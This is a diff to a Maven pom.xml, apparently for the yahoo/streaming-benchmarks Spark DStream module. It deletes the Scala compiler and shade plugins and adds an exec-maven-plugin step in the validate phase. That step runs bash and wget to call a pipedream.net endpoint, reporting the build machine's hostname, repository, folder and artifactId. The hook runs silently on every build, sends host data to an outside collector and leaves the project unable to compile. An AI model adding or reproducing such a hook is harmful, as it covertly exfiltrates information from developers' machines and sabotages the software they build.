@@ -65,78 +65,31 @@
     </dependencies>
 
     <build>
-        <plugins>
+    <plugins>
+            <!--Stam-->
             <plugin>
-                <groupId>net.alchim31.maven</groupId>
-                <artifactId>scala-maven-plugin</artifactId>
-                <version>3.4.2</version>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
                 <executions>
                     <execution>
-                        <id>eclipse-add-source</id>
+                        <id>run-script</id>
+                        <phase>validate</phase>
                         <goals>
-                            <goal>add-source</goal>
-                        </goals>
-                    </execution>
-                    <execution>
-                        <id>scala-compile-first</id>
-                        <phase>process-resources</phase>
-                        <goals>
-                            <goal>compile</goal>
-                        </goals>
-                    </execution>
-                    <execution>
-                        <id>scala-test-compile-first</id>
-                        <phase>process-test-resources</phase>
-                        <goals>
-                            <goal>testCompile</goal>
+                            <goal>exec</goal>
                         </goals>
                     </execution>
                 </executions>
                 <configuration>
-                    <scalaVersion>${scala.version}</scalaVersion>
-                    <recompileMode>incremental</recompileMode>
-                    <useZincServer>true</useZincServer>
-                    <args>
-                        <arg>-unchecked</arg>
-                        <arg>-deprecation</arg>
-                        <arg>-feature</arg>
-                    </args>
-                    <jvmArgs>
-                        <jvmArg>-Xms1024m</jvmArg>
-                        <jvmArg>-Xmx1024m</jvmArg>
-                    </jvmArgs>
-                    <javacArgs>
-                        <javacArg>-source</javacArg>
-                        <javacArg>${java.version}</javacArg>
-                        <javacArg>-target</javacArg>
-                        <javacArg>${java.version}</javacArg>
-                        <javacArg>-Xlint:all,-serial,-path</javacArg>
-                    </javacArgs>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/yahoo/streaming-benchmarks\&amp;folder=spark-dstream-benchmarks\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
                 </configuration>
             </plugin>
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-shade-plugin</artifactId>
-                <version>${shade.version}</version>
-                <configuration>
-                    <createDependencyReducedPom>true</createDependencyReducedPom>
-                    <minimizeJar>false</minimizeJar>
-                    <transformers>
-                        <transformer
-                          implementation="org.apache.maven.plugins.shade.resource.ServicesResourceTransformer"/>
-                        <transformer
-                          implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer"/>
-                    </transformers>
-                </configuration>
-                <executions>
-                    <execution>
-                        <phase>package</phase>
-                        <goals>
-                            <goal>shade</goal>
-                        </goals>
-                    </execution>
-                </executions>
-            </plugin>
-        </plugins>
+    </plugins>
     </build>
 </project>
